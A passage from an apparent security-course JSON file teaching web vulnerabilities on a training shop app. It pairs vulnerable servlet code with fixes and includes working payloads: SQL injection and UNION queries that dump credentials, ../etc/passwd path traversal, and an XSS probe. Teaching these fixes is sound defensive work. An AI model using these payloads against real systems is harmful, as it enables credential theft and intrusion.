+          "ai_explanation": "CSRF exploits the browser's automatic cookie sending:\n1. When you log into ShopSecure, your browser stores a session cookie\n2. The browser sends this cookie with EVERY request to ShopSecure's domain\n3. The attacker's page creates a form targeting ShopSecure's profile endpoint\n4. onload='document.forms[0].submit()' means it submits IMMEDIATELY\n5. The browser attaches your session cookie to this request\n6. ShopSecure sees a valid session + valid form data → updates profile\n\nThe server can't distinguish between:\n- Alice intentionally updating her profile\n- A malicious page submitting the form on Alice's behalf\n\nA CSRF token is the solution: a random value that the attacker can't guess.",
+          "ai_challenge": "Write the FIXED version of doPost that generates and verifies a CSRF token. You'll need both the form (doGet) and the handler (doPost) changes."
+        },
+        {
+          "title": "Example 5: Path Traversal — Reading Server Files",
+          "description": "Demonstrates how ../  sequences in a file download URL can read arbitrary server files",
+          "difficulty": "intermediate",
+          "code": "// DownloadServlet.java — VULNERABLE VERSION\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n\n    // VULNERABLE: Direct path concatenation\n    File file = new File(\"web/invoices/\" + filename);\n\n    // No path validation! filename can contain ../\n    if (file.exists()) {\n        // Serve the file content to the user\n        byte[] content = Files.readAllBytes(file.toPath());\n        resp.getOutputStream().write(content);\n    }\n}\n\n// How the path resolves:\n// Normal:   web/invoices/invoice_001.pdf  → ✅ correct file\n// Attack:   web/invoices/../../../etc/passwd\n//           → web/etc/passwd  (simplified)\n//           → /etc/passwd     (after OS resolution)\n//           → ❌ system file exposed!",
+          "output": "NORMAL: /shop/download?file=invoice_001.pdf\n→ Downloads: Invoice #001 (legitimate invoice PDF)\n\nEXPLOITED: /shop/download?file=../../../etc/passwd\n→ Downloads content of /etc/passwd:\n   root:x:0:0:root:/root:/bin/bash\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   student:x:1000:1000::/home/student:/bin/bash\n   ...\n\nWORSE: /shop/download?file=../../src/DatabaseHelper.java\n→ Downloads application source code with database credentials!",
+          "ai_explanation": "Path traversal works by abusing relative path resolution:\n- 'web/invoices/' is the intended base directory\n- '../' means 'go up one directory'\n- '../../../' goes up THREE directories from web/invoices/\n- This reaches the system root, from where /etc/passwd is accessible\n\nThe OS resolves the path:\nweb/invoices/../../../etc/passwd\n  → web/../../../etc/passwd  (up from invoices)\n  → ../../etc/passwd         (up from web)\n  → ../etc/passwd            (up from project)\n  → /etc/passwd              (at system root)\n\nThe fix must check that the RESOLVED path stays inside web/invoices/.",
+          "ai_challenge": "Write code that validates the path using Java's Path.normalize() and startsWith() to prevent traversal. What about encoded characters like %2e%2e%2f?"
+        },
+        {
+          "title": "Example 6: Fixing SQL Injection with PreparedStatement",
+          "description": "Complete before/after showing how to convert a vulnerable query to a safe parameterised query",
+          "difficulty": "beginner",
+          "code": "// ========= BEFORE (VULNERABLE) =========\npublic static ResultSet searchProducts(Connection conn, String query)\n        throws SQLException {\n    String sql = \"SELECT * FROM products WHERE hidden = 0 AND \"\n        + \"(name LIKE '%\" + query + \"%')\";\n    Statement stmt = conn.createStatement();\n    return stmt.executeQuery(sql);\n}\n\n// ========= AFTER (FIXED) =========\npublic static ResultSet searchProducts(Connection conn, String query)\n        throws SQLException {\n    String sql = \"SELECT * FROM products WHERE hidden = 0 AND \"\n        + \"(name LIKE ? OR description LIKE ? OR category LIKE ?)\";\n    PreparedStatement pstmt = conn.prepareStatement(sql);\n    String searchTerm = \"%\" + query + \"%\";\n    pstmt.setString(1, searchTerm);\n    pstmt.setString(2, searchTerm);\n    pstmt.setString(3, searchTerm);\n    return pstmt.executeQuery();\n}\n// The ? placeholders ensure user input is ALWAYS treated as data.\n// Even if someone types ' OR '1'='1, the database searches\n// for a product literally named \" ' OR '1'='1 \" — and finds nothing.",
+          "output": "BEFORE FIX — searching ' OR '1'='1 :\n→ Returns 20 products (all, including hidden) ❌\n\nAFTER FIX — searching ' OR '1'='1 :\n→ Returns 0 products (no product has that literal name) ✅\n\nAFTER FIX — searching headphones:\n→ Returns 1 product: Wireless Headphones ✅ (still works normally)",
+          "ai_explanation": "The key difference:\nBEFORE: sql = \"...name LIKE '%\" + query + \"%'\"  →  query becomes part of SQL SYNTAX\nAFTER:  sql = \"...name LIKE ?\"  →  query is injected as a PARAMETER value\n\nWith PreparedStatement:\n1. The SQL structure is sent to the database FIRST (with ? placeholders)\n2. The database COMPILES the query structure\n3. Then the parameter values are sent SEPARATELY\n4. The database can NEVER confuse data for commands\n\nIt's like the difference between:\n- Giving someone a sentence with blanks to fill in (PreparedStatement)\n- Letting someone write the entire sentence (String concatenation)",
+          "ai_challenge": "The search needs to match name, description, AND category. Add the additional LIKE clauses to the PreparedStatement. How many ? parameters do you need?"
+        },
+        {
+          "title": "Example 7: Fixing XSS with Output Encoding",
+          "description": "Shows how HTML encoding review content prevents script execution",
+          "difficulty": "beginner",
+          "code": "// ========= UTILITY METHOD =========\npublic static String htmlEncode(String input) {\n    if (input == null) return \"\";\n    return input\n        .replace(\"&\", \"&amp;\")   // Must be first!\n        .replace(\"<\", \"&lt;\")\n        .replace(\">\", \"&gt;\")\n        .replace(\"\\\"\", \"&quot;\")\n        .replace(\"'\", \"&#39;\");\n}\n\n// ========= BEFORE (VULNERABLE) =========\nString content = reviews.getString(\"content\");\nout.printf(\"<p>%s</p>\", content);  // Raw HTML rendered!\n\n// ========= AFTER (FIXED) =========\nString content = reviews.getString(\"content\");\nout.printf(\"<p>%s</p>\", htmlEncode(content));  // Safe!",
+          "output": "Review content in DB: <script>alert('XSS')</script>\n\nBEFORE (vulnerable):\nBrowser receives: <p><script>alert('XSS')</script></p>\n→ Script EXECUTES — alert box appears ❌\n\nAFTER (fixed):\nBrowser receives: <p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>\n→ Displays as visible TEXT: <script>alert('XSS')</script> ✅\n→ No script execution — browser renders entities as text",
+          "ai_explanation": "HTML encoding replaces special characters with their entity equivalents:\n< becomes &lt;  |  > becomes &gt;  |  & becomes &amp;\n\nWhy this works:\n- The browser sees &lt;script&gt; in the HTML source\n- It knows &lt; is a display character, not a tag delimiter\n- So it renders the literal text '<script>' on screen\n- No script tag is created, no code executes\n\nIMPORTANT: Encode on OUTPUT, not input. Store the original content\nin the database — encode it only when rendering to HTML. This way,\nif you need to display the content in a different format (JSON, PDF),\nyou still have the original data.",
+          "ai_challenge": "What about XSS in HTML attributes? If user input goes into <img src='USER_INPUT'>, does HTML encoding alone protect you? Research attribute context encoding."
+        },
+        {
+          "title": "Example 8: Fixing Broken Access Control with Role Checking",
+          "description": "Complete fix for admin endpoint showing proper authorisation checking",
+          "difficulty": "intermediate",
+          "code": "// ========= FIXED AdminServlet.java =========\npublic class AdminServlet extends HttpServlet {\n\n    // Reusable authorisation check\n    private boolean isAdmin(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        HttpSession session = req.getSession(false);\n\n        // Check 1: Is user logged in?\n        if (session == null || session.getAttribute(\"userId\") == null) {\n            resp.sendRedirect(\"/shop/login\");\n            return false;\n        }\n\n        // Check 2: Is user an admin? ← THIS WAS MISSING\n        String role = (String) session.getAttribute(\"role\");\n        if (!\"admin\".equals(role)) {\n            resp.sendError(HttpServletResponse.SC_FORBIDDEN,\n                \"Access Denied: Admin privileges required\");\n            return false;\n        }\n        return true;\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        if (!isAdmin(req, resp)) return;  // One-line check!\n\n        // Only admins reach this point\n        renderAdminDashboard(req, resp);\n    }\n}",
+          "output": "AS ADMIN (admin/shopAdmin123):\nNavigate to /shop/admin/users → Full user list displayed ✅\n\nAS CUSTOMER (customer1/custPass1):\nNavigate to /shop/admin/users → HTTP 403 Forbidden ✅\n\"Access Denied: Admin privileges required\"\n\nNOT LOGGED IN:\nNavigate to /shop/admin/users → Redirected to /shop/login ✅",
+          "ai_explanation": "The fix adds a TWO-LAYER check:\nLayer 1 (Authentication): Is there a valid session with a userId?\n  → No: Redirect to login (you need to prove who you are)\nLayer 2 (Authorisation): Does the session have role='admin'?\n  → No: Return 403 Forbidden (you're not allowed here)\n\nThe isAdmin() method is reusable across all admin endpoints.\nThis is the Principle of Least Privilege: users should only\naccess what they NEED for their role, nothing more.\n\nWhy 403 (Forbidden) and not 404 (Not Found)?\n- 403 tells the user 'this exists but you can't access it'\n- Some security teams prefer 404 to avoid revealing page existence",
+          "ai_challenge": "What about horizontal access control? Customer1 should only see their OWN orders, not customer2's. How would you add that check?"
+        },
+        {
+          "title": "Example 9: Fixing CSRF with Token Validation",
+          "description": "Complete implementation of CSRF token generation, embedding in form, and server-side verification",
+          "difficulty": "intermediate",
+          "code": "// ========= FIXED ProfileServlet.java =========\nimport java.util.UUID;\n\n// STEP 1: Generate token and embed in form (doGet)\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    HttpSession session = req.getSession(false);\n    // Generate unique token for this session\n    String csrfToken = UUID.randomUUID().toString();\n    session.setAttribute(\"csrfToken\", csrfToken);\n\n    // Embed token in the form as a hidden field\n    out.print(\"<form method='POST' action='/shop/profile/edit'>\");\n    out.printf(\"<input type='hidden' name='csrf_token' value='%s'>\", csrfToken);\n    out.print(\"<label>Email</label><input name='email' value='...'/>\");\n    out.print(\"<button type='submit'>Save</button>\");\n    out.print(\"</form>\");\n}\n\n// STEP 2: Verify token before processing (doPost)\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    HttpSession session = req.getSession(false);\n    String expectedToken = (String) session.getAttribute(\"csrfToken\");\n    String submittedToken = req.getParameter(\"csrf_token\");\n\n    // Verify: does the submitted token match what we generated?\n    if (expectedToken == null || !expectedToken.equals(submittedToken)) {\n        resp.sendError(403, \"CSRF validation failed\");\n        return;  // Reject the request\n    }\n\n    // Token valid — process the profile update\n    String email = req.getParameter(\"email\");\n    DatabaseHelper.updateProfile(conn, userId, email, ...);\n}",
+          "output": "LEGITIMATE UPDATE (from real form):\n→ Form includes csrf_token=a7f3b2c1-...\n→ Server compares with session token → MATCH ✅\n→ Profile updated successfully\n\nCSRF ATTACK (from evil.html):\n→ Attacker's form has no csrf_token field (or a random guess)\n→ Server compares: null ≠ a7f3b2c1-... → MISMATCH ❌\n→ HTTP 403: CSRF validation failed\n→ Profile NOT changed — attack blocked!",
+          "ai_explanation": "Why this works:\n1. UUID.randomUUID() generates a 128-bit random token\n   (e.g., 'a7f3b2c1-d4e5-6789-abcd-ef0123456789')\n2. This token exists in TWO places: the user's session AND the form HTML\n3. When the form submits, both values must match\n4. The attacker on evil.com can create a form targeting your server\n5. BUT they can't read the CSRF token from your page (Same-Origin Policy)\n6. So their forged request arrives without a valid token → rejected\n\nKey: The token is RANDOM and PER-SESSION. Even if an attacker\nsees one token, it changes for the next session.",
+          "ai_challenge": "What about single-page applications that use AJAX? They can't use hidden form fields. Research how CSRF protection works with the 'Double Submit Cookie' or 'Custom Header' patterns."
+        },
+        {
+          "title": "Example 10: Fixing Path Traversal with Path Canonicalisation",
+          "description": "Shows how to validate that file paths stay within the allowed directory",
+          "difficulty": "intermediate",
+          "code": "import java.nio.file.Path;\nimport java.nio.file.Paths;\n\n// ========= FIXED DownloadServlet.java =========\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp)\n        throws IOException {\n    String filename = req.getParameter(\"file\");\n    if (filename == null || filename.isEmpty()) {\n        resp.sendError(400, \"No file specified\");\n        return;\n    }\n\n    // Define the allowed base directory\n    Path basePath = Paths.get(\"web/invoices\").toAbsolutePath().normalize();\n\n    // Resolve the requested file and NORMALISE the path\n    // normalize() collapses ../ sequences\n    Path requestedPath = basePath.resolve(filename).normalize();\n\n    // THE KEY CHECK: Does the resolved path start with our base?\n    if (!requestedPath.startsWith(basePath)) {\n        resp.sendError(403, \"Access denied\");\n        return;  // Path escapes the allowed directory!\n    }\n\n    // Additional: check file exists\n    File file = requestedPath.toFile();\n    if (!file.exists() || !file.isFile()) {\n        resp.sendError(404, \"File not found\");\n        return;\n    }\n\n    // Safe to serve the file\n    resp.setContentType(\"application/octet-stream\");\n    Files.copy(requestedPath, resp.getOutputStream());\n}",
+          "output": "NORMAL: ?file=invoice_001.pdf\n  basePath:      /app/web/invoices\n  requestedPath: /app/web/invoices/invoice_001.pdf\n  startsWith?    YES ✅ → File served\n\nATTACK: ?file=../../../etc/passwd\n  basePath:      /app/web/invoices\n  requestedPath: /etc/passwd  (after normalize)\n  startsWith?    NO ❌ → 403 Access Denied\n\nSNEAKY: ?file=....//....//etc/passwd\n  requestedPath: /etc/passwd  (normalize handles this too)\n  startsWith?    NO ❌ → 403 Access Denied",
+          "ai_explanation": "The fix uses THREE Java Path operations:\n\n1. toAbsolutePath(): Converts relative path to full path\n   'web/invoices' → '/home/student/ShopSecure/build/classes/web/invoices'\n\n2. normalize(): Collapses ../ and ./ sequences\n   '/app/web/invoices/../../../etc/passwd' → '/etc/passwd'\n\n3. startsWith(): Checks if resolved path begins with base path\n   '/etc/passwd'.startsWith('/app/web/invoices') → false!\n\nThis is called 'path canonicalisation' — converting any path\nto its simplest, absolute form before checking it.\nWithout normalize(), an attacker could use encoded characters\nor double-dots to bypass simple string checks.",
+          "ai_challenge": "What about URL-encoded path traversal like %2e%2e%2f? Does Java's resolve() handle this? Should you URL-decode the input first or after resolution?"
+        },
+        {
+          "title": "Example 11: Information Exposure — Secure Error Handling",
+          "description": "Replaces detailed stack traces with generic error messages and server-side logging",
+          "difficulty": "advanced",
+          "code": "import java.util.logging.Logger;\n\n// ========= FIXED Error Handling =========\npublic class ShopErrorHandler extends ErrorHandler {\n    private static final Logger log = Logger.getLogger(\"ShopSecure\");\n\n    @Override\n    public void handle(String target, Request baseRequest,\n            HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        int status = resp.getStatus();\n        Throwable error = (Throwable) req.getAttribute(\n            \"javax.servlet.error.exception\");\n\n        // LOG detailed info server-side (for developers)\n        if (error != null) {\n            String errorRef = \"ERR-\" + System.currentTimeMillis();\n            log.severe(String.format(\"[%s] %s: %s\",\n                errorRef, error.getClass().getName(), error.getMessage()));\n            log.severe(getStackTrace(error));\n        }\n\n        // SHOW generic message to user (reveals nothing)\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        out.print(\"<h1>Something went wrong</h1>\");\n        out.print(\"<p>We've logged this error and will look into it.</p>\");\n        if (error != null) {\n            out.printf(\"<p>Reference: %s</p>\", errorRef);\n        }\n        out.print(\"<a href='/shop/'>Return to Home</a>\");\n        // NO stack trace, NO class names, NO server info\n    }\n}",
+          "output": "BEFORE (vulnerable):\n  Error: java.sql.SQLException: near \"'\": syntax error\n  at DatabaseHelper.searchProducts(DatabaseHelper.java:142)\n  at SearchServlet.doGet(SearchServlet.java:28)\n  Server: Jetty 9.4.53 | Java 17.0.2 | Linux 5.15.0\n\nAFTER (fixed):\n  Something went wrong\n  We've logged this error and will look into it.\n  Reference: ERR-1709123456789\n  [Return to Home]\n\nServer log (not visible to users):\n  [SEVERE] [ERR-1709123456789] java.sql.SQLException: near...\n  (full stack trace here for developers)",
+          "ai_explanation": "The principle: SEPARATE what users see from what developers see.\n\nUsers get: A friendly error page with a reference number they can\nreport to support. No technical details, no class names, no versions.\n\nDevelopers get: Full stack trace, request details, and the same\nreference number in the server logs for correlation.\n\nWhat the old error page revealed to attackers:\n- Java class names → application architecture\n- Line numbers → helps find vulnerable code\n- SQL error messages → database schema\n- Server version → known vulnerabilities for that version\n- OS and Java version → attack surface narrowing",
+          "ai_challenge": "Some frameworks like Spring have built-in error handling profiles. Research how server.error.include-stacktrace=never works in Spring Boot. How does this compare to our manual approach?"
+        },
+        {
+          "title": "Example 12: Complete Vulnerability Report",
+          "description": "A full professional vulnerability report entry for SQL injection — the format used in real security assessments",
+          "difficulty": "advanced",
+          "code": "// This is not code to run — it's a vulnerability report template.\n// Use this format for each vulnerability you find.\n\n/*\n=================================================================\nVULNERABILITY REPORT: SQL Injection in Product Search\n=================================================================\n\nCLASSIFICATION:\n  CWE ID:     CWE-89 (SQL Injection)\n  OWASP:      A03:2025 — Injection\n  Severity:   CRITICAL\n  CVSS Score: 9.8 (Critical)\n\nLOCATION:\n  Endpoint:   GET /shop/search?q={user_input}\n  Source File: SearchServlet.java → calls DatabaseHelper.searchProducts()\n  Root Cause:  String concatenation in SQL query construction\n\nDESCRIPTION:\n  The product search endpoint passes user input directly into a\n  SQL query via string concatenation. This allows an attacker to\n  modify the query logic and access unauthorised data.\n\nSTEPS TO REPRODUCE:\n  1. Navigate to http://localhost:16000/shop/search\n  2. In the search box, enter: ' OR '1'='1\n  3. Click Search\n  4. Observe: All 20 products returned including 2 hidden ones\n\nIMPACT:\n  Confidentiality: HIGH — All database records accessible\n  Integrity:       HIGH — Data can be modified via injection\n  Availability:    MEDIUM — Tables could be dropped\n\nEVIDENCE:\n  [Screenshot 1: Normal search for 'headphones' — 1 result]\n  [Screenshot 2: Injected search — 20 results with HIDDEN tag]\n\nREMEDIATION:\n  Replace Statement with PreparedStatement in\n  DatabaseHelper.searchProducts(). Use ? placeholders for all\n  user-supplied values.\n================================================================\n*/",
+          "output": "This is a report template — no executable output. Use this structure for every vulnerability you document in your assessment.",
+          "ai_explanation": "A professional vulnerability report has 8 sections:\n\n1. CLASSIFICATION: CWE + OWASP + Severity → Universal language\n2. LOCATION: Exact endpoint + source file → Developer knows WHERE\n3. DESCRIPTION: What's wrong in plain English → Anyone can understand\n4. STEPS TO REPRODUCE: Exact inputs → Developer can verify\n5. IMPACT: CIA assessment → Business understands the risk\n6. EVIDENCE: Screenshots → Proof it's real\n7. REMEDIATION: Specific fix → Developer knows WHAT to change\n\nGood reports get vulnerabilities fixed FAST.\nVague reports get ignored.",
+          "ai_challenge": "Write a complete vulnerability report for the Broken Access Control issue, following this exact template. Include all 8 sections."
+        },
+        {
+          "title": "Example 13: Union-Based SQL Injection — Extracting User Data",
+          "description": "Advanced SQL injection technique that reads data from different database tables",
+          "difficulty": "advanced",
+          "code": "// UNION-based SQL Injection — more dangerous than basic OR injection\n// The UNION keyword combines results from two SELECT queries.\n\n// Step 1: Determine number of columns in original query\n// Try: ' UNION SELECT null-- (error: column count mismatch)\n// Try: ' UNION SELECT null,null,null,null,null,null,null,null--\n// (Success when column count matches original SELECT)\n\n// Step 2: Extract data from users table\n// Payload:\n// ' UNION SELECT id, username, password, email, full_name, phone, address, role FROM users--\n\n// What the SQL becomes:\n// SELECT * FROM products WHERE name LIKE '%'\n// UNION\n// SELECT id, username, password, email, full_name, phone, address, role FROM users\n// --'\n\n// The -- comments out the rest of the original query\n// Result: Product list + ALL user credentials in the same table!\n\n// ⚠ THIS IS FOR EDUCATIONAL UNDERSTANDING ONLY\n// Never attempt this on systems you don't own or have permission to test",
+          "output": "Normal search results PLUS:\n  ID: 1 | Name: admin | Desc: shopAdmin123 | Price: admin@shopsecure.local\n  ID: 2 | Name: customer1 | Desc: custPass1 | Price: alice@example.com\n  ID: 3 | Name: customer2 | Desc: custPass2 | Price: bob@example.com\n  ...\n\nThe user data appears in product columns because UNION\nmerges the results. Passwords are in the 'description' column,\nemails appear as 'prices'. The attacker now has EVERY credential.",
+          "ai_explanation": "UNION injection is more powerful than OR injection:\n\nOR injection: ' OR '1'='1 → sees all rows from the SAME table\nUNION injection: ' UNION SELECT ... FROM users-- → sees rows from ANY table\n\nThe technique:\n1. First, find how many columns the original query returns\n   (try UNION SELECT null,null,... until no error)\n2. Then replace nulls with column names from the target table\n3. The -- at the end comments out the rest of the original query\n\nThis is why SQL injection is rated CRITICAL:\n- It doesn't just expose the searched table\n- It can read ANY table in the database\n- Including users, passwords, session tokens, admin configs",
+          "ai_challenge": "What if the application doesn't display error messages (blind SQL injection)? Research how boolean-based and time-based blind SQLi techniques work."
+        },
+        {
+          "title": "Example 14: Defence in Depth — Layered Security",
+          "description": "Shows how multiple security measures work together to protect an application",
+          "difficulty": "advanced",
+          "code": "// DEFENCE IN DEPTH: No single fix protects everything.\n// Layer multiple defences so if one fails, others catch it.\n\n// Layer 1: INPUT VALIDATION — at the boundary\nString searchQuery = req.getParameter(\"q\");\nif (searchQuery.length() > 100) {\n    resp.sendError(400, \"Search query too long\");\n    return;\n}\n// Rejects absurdly long inputs that are likely attacks\n\n// Layer 2: PARAMETERISED QUERIES — at the database\nPreparedStatement ps = conn.prepareStatement(\n    \"SELECT * FROM products WHERE name LIKE ?\");\nps.setString(1, \"%\" + searchQuery + \"%\");\n// Even if validation is bypassed, injection still impossible\n\n// Layer 3: OUTPUT ENCODING — at the display\nwhile (rs.next()) {\n    out.printf(\"<p>%s</p>\", htmlEncode(rs.getString(\"name\")));\n}\n// Even if bad data reaches the DB, it can't execute as HTML\n\n// Layer 4: ACCESS CONTROL — at the endpoint\n// Only show hidden products to admins\nif (!isAdmin) sql += \" AND hidden = 0\";\n\n// Layer 5: ERROR HANDLING — at the catch block\n// Never reveal stack traces to users\n// Log errors server-side with reference numbers\n\n// All 5 layers working together = robust security",
+          "output": "Attack attempt: ' OR '1'='1\n  Layer 1: Query is 14 chars — passes length check ✅ (not caught)\n  Layer 2: PreparedStatement treats it as literal text ✅ BLOCKED\n  Result: 0 products found (no product named \" ' OR '1'='1 \")\n\nAttack attempt: <script>alert('xss')</script>\n  Layer 1: 35 chars — passes length check ✅ (not caught)\n  Layer 2: Stored in DB as text (not SQL, so no issue)\n  Layer 3: Output encoding renders as visible text ✅ BLOCKED\n  Result: Script visible but NOT executable\n\nThis is defence in depth — each layer catches what others miss.",
+          "ai_explanation": "Defence in Depth is like a castle:\n- Moat (input validation) — first barrier, stops obvious attacks\n- Outer wall (parameterisation) — strong structural defence\n- Inner wall (output encoding) — protects even if outer wall breached\n- Guards (access control) — verify identity at every door\n- Alarm system (error handling) — alerts defenders, hides layout from attackers\n\nNo single defence is perfect:\n- Input validation can be bypassed with encoding tricks\n- PreparedStatements don't protect against XSS\n- Output encoding doesn't prevent data theft via SQLi\n\nBut COMBINED, they create a security posture where an attacker\nmust bypass ALL layers to succeed — exponentially harder.",
+          "ai_challenge": "Design a 'security checklist' for a new servlet endpoint. What would you check at each layer? How would you test that each defence works?"
+        }
+      ],
+      "visual_diagram": {
+        "title": "Web Application Vulnerability Assessment Workflow",
+        "content": "<div style=\"font-family: 'Courier New', monospace; line-height: 1.6; padding: 10px;\">\n\n<div style=\"text-align: center; margin-bottom: 20px;\">\n<span style=\"background: #1B2A4A; color: white; padding: 8px 24px; border-radius: 8px; font-size: 18px; font-weight: bold;\">🔍 Web Application Vulnerability Assessment Workflow</span>\n</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #e74c3c; color: white; padding: 6px 16px; border-radius: 20px; font-weight: bold;\">▶ START: Receive Application to Test</span>\n</div>\n<div style=\"text-align: center; color: #666;\">│</div>\n<div style=\"text-align: center; color: #666;\">▼</div>\n\n<div style=\"text-align: center; margin: 10px 0;\">\n<span style=\"background: #3498db; color: white; padding: 6px 16px; border-radius: 4px;\">📋 PHASE 1: RECONNAISSANCE</span>\n</div>\n<div style=\"margin-left: 40px; border-left: 3px solid #3498db; padding-left: 15px; margin-bottom: 10px;\">\n  <span style=\"color: #3498db;\">●</span> Browse the application as a normal user<br>\n  <span style=\"color: #3498db;\">●</span> Map all pages, forms, and input fields<br>\n  <span style=\"color: #3498db;\">●</span> Note URL patterns and parameters<br>\n  <span style=\"color: #3498db;\">●</span> Identify user roles (admin, customer, guest)<br>\n  <span style=\"color: #3498db;\">●</span> Check what data is visible to each role\n</div>\n\n<div style=\"text-align: center; color: #666;\">│</div>\n<div style=\"text-align: center; color: #666;\">▼</div>\n\n<div style=\"text-align: center; margin: 10px 0;\">\n<span style=\"background: #f39c12; color: white; padding: 6px 16px; border-radius: 4px;\">🎯 PHASE 2: IDENTIFY VULNERABILITIES</span>\n</div>\n<div style=\"margin-left: 40px; border-left: 3px solid #f39c12; padding-left: 15px; margin-bottom: 10px;\">\n  <span style=\"color: #e74c3c; font-weight: bold;\">Check each input point:</span><br><br>\n  <span style=\"background: #e74c3c; color: white; padding: 2px 8px; border-radius: 3px;\">SQLi</span> Does the app put input into database queries? → Try: <span style=\"color: #e74c3c;\">' OR '1'='1</span><br>\n  <span style=\"background: #e67e22; color: white; padding: 2px 8px; border-radius: 3px;\">XSS</span> Does the app display user content? → Try: <span style=\"color: #e67e22;\">&lt;script&gt;alert(1)&lt;/script&gt;</span><br>\n  <span style=\"background: #9b59b6; color: white; padding: 2px 8px; border-radius: 3px;\">BAC</span> Can you access admin pages as customer? → Try: <span style=\"color: #9b59b6;\">/admin/users in URL</span><br>\n  <span style=\"background: #2980b9; color: white; padding: 2px 8px; border-radius: 3px;\">CSRF</span> Do forms have anti-CSRF tokens? → Check: <span style=\"color: #2980b9;\">View page source for hidden fields</span><br>\n  <span style=\"background: #27ae60; color: white; padding: 2px 8px; border-radius: 3px;\">PATH</span> Does the app serve files by name? → Try: <span style=\"color: #27ae60;\">../../../etc/passwd</span><br>\n  <span style=\"background: #95a5a6; color: white; padding: 2px 8px; border-radius: 3px;\">INFO</span> Does the app show error details? → Try: <span style=\"color: #95a5a6;\">Send malformed input</span>\n</div>\n\n<div style=\"text-align: center; color: #666;\">│</div>\n<div style=\"text-align: center; color: #666;\">▼</div>\n\n<div style=\"text-align: center; margin: 10px 0;\">\n<span style=\"background: #e74c3c; color: white; padding: 6px 16px; border-radius: 4px;\">💥 PHASE 3: EXPLOIT & DOCUMENT</span>\n</div>\n<div style=\"margin-left: 40px; border-left: 3px solid #e74c3c; padding-left: 15px; margin-bottom: 10px;\">\n  For each vulnerability found:<br>\n  <span style=\"color: #2ecc71;\">✓</span> Show <strong>NORMAL</strong> behaviour (screenshot)<br>\n  <span style=\"color: #2ecc71;\">✓</span> Show <strong>EXPLOITED</strong> behaviour (screenshot)<br>\n  <span style=\"color: #2ecc71;\">✓</span> Record the exact payload/input used<br>\n  <span style=\"color: #2ecc71;\">✓</span> Assess <span style=\"color: #e74c3c; font-weight: bold;\">C</span>onfidentiality, <span style=\"color: #f39c12; font-weight: bold;\">I</span>ntegrity, <span style=\"color: #3498db; font-weight: bold;\">A</span>vailability impact<br>\n  <span style=\"color: #2ecc71;\">✓</span> Classify using OWASP Top 10 and CWE\n</div>\n\n<div style=\"text-align: center; color: #666;\">│</div>\n<div style=\"text-align: center; color: #666;\">▼</div>\n\n<div style=\"text-align: center; margin: 10px 0;\">\n<span style=\"background: #2ecc71; color: white; padding: 6px 16px; border-radius: 4px;\">🔧 PHASE 4: FIX & VERIFY</span>\n</div>\n<div style=\"margin-left: 40px; border-left: 3px solid #2ecc71; padding-left: 15px; margin-bottom: 10px;\">\n  <span style=\"color: #e74c3c;\">SQLi Fix:</span> <span style=\"background: #e8f5e9; padding: 2px 6px;\">PreparedStatement with ? parameters</span><br>\n  <span style=\"color: #e67e22;\">XSS Fix:</span> <span style=\"background: #e8f5e9; padding: 2px 6px;\">HTML output encoding (&lt; → &amp;lt;)</span><br>\n  <span style=\"color: #9b59b6;\">BAC Fix:</span> <span style=\"background: #e8f5e9; padding: 2px 6px;\">Server-side role check on every endpoint</span><br>\n  <span style=\"color: #2980b9;\">CSRF Fix:</span> <span style=\"background: #e8f5e9; padding: 2px 6px;\">Random token per session, verify on submit</span><br>\n  <span style=\"color: #27ae60;\">PATH Fix:</span> <span style=\"background: #e8f5e9; padding: 2px 6px;\">Path.normalize() + startsWith() check</span><br>\n  <span style=\"color: #95a5a6;\">INFO Fix:</span> <span style=\"background: #e8f5e9; padding: 2px 6px;\">Generic error page + server-side logging</span>\n</div>\n\n<div style=\"text-align: center; color: #666;\">│</div>\n<div style=\"text-align: center; color: #666;\">▼</div>\n\n<div style=\"text-align: center; margin: 15px 0;\">\n<span style=\"background: #2ecc71; color: white; padding: 6px 16px; border-radius: 20px; font-weight: bold;\">✅ FINISH: Submit Assessment Report</span>\n</div>\n\n<div style=\"margin-top: 20px; padding: 12px; border: 2px solid #f39c12; border-radius: 8px; background: #fff8e1;\">\n<span style=\"color: #f39c12; font-weight: bold;\">💡 REMEMBER — The Assessment Checklist:</span><br>\n<span style=\"color: #333;\">For each vulnerability:</span><br>\n□ Name and type (e.g., SQL Injection, CWE-89)<br>\n□ Location in the app (page, endpoint, input field)<br>\n□ CIA impact assessment<br>\n□ Severity rating (Critical/High/Medium/Low)<br>\n□ Exact exploit payload<br>\n□ Screenshot evidence (normal vs exploited)<br>\n□ Real-world scenario<br>\n□ Fix with code snippet<br>\n□ OWASP Top 10 category\n</div>\n\n<div style=\"margin-top: 15px; padding: 12px; border: 2px solid #9b59b6; border-radius: 8px; background: #f3e5f5;\">\n<span style=\"color: #9b59b6; font-weight: bold;\">🧠 SEVERITY QUICK REFERENCE:</span><br>\n<span style=\"background: #e74c3c; color: white; padding: 1px 6px; border-radius: 3px;\">CRITICAL</span> Easy to find + Easy to exploit + Major damage (SQLi in search)<br>\n<span style=\"background: #e67e22; color: white; padding: 1px 6px; border-radius: 3px;\">HIGH</span> Easy to find + Requires login + Significant damage (BAC)<br>\n<span style=\"background: #f39c12; color: white; padding: 1px 6px; border-radius: 3px;\">MEDIUM</span> Moderate to find + Needs setup + Moderate damage (CSRF, XSS)<br>\n<span style=\"background: #95a5a6; color: white; padding: 1px 6px; border-radius: 3px;\">LOW</span> Hard to find + Limited damage (Info exposure, server version)\n</div>\n\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: Spot the Vulnerable Query",
+          "description": "Look at the code below. Which line makes this query vulnerable to SQL injection? Identify the problem and explain why it's dangerous.",
+          "difficulty": "beginner",
+          "category": "Guided Challenge",
+          "estimated_minutes": 5,
